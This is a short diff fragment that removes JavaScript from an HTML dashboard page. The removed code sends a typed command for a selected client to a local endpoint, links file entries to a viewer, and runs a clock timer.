-            if (!command) return;
-
-            if (!selectedClient) {
-                selectedClient = clientSelect.value;
-            }
-
-            if (!selectedClient) {
-                alert('No client selected');
-                return;
-            }
-
-            const formData = new FormData();
-            formData.append('client_id', selectedClient);
-            formData.append('command', command);
-
-            const response = await fetch('/send_command', {
-                method: 'POST',
-                body: formData
-            });
-            const result = await response.json();
-            console.log(`Command "${command}" sent to ${selectedClient}: ${result.message}`);
-            commandInput.value = '';
-        });
-
-        // Handle file clicks
-        document.querySelectorAll('.file-item').forEach(item => {
-            item.addEventListener('click', () => {
-                const filename = item.getAttribute('data-filename');
-                window.location.href = `/view_file/${filename}`;
-            });
-        });
-
-        // Initialize everything
-        updateTime();
-        setInterval(updateTime, 1000);
     </script>
 </body>
 </html>
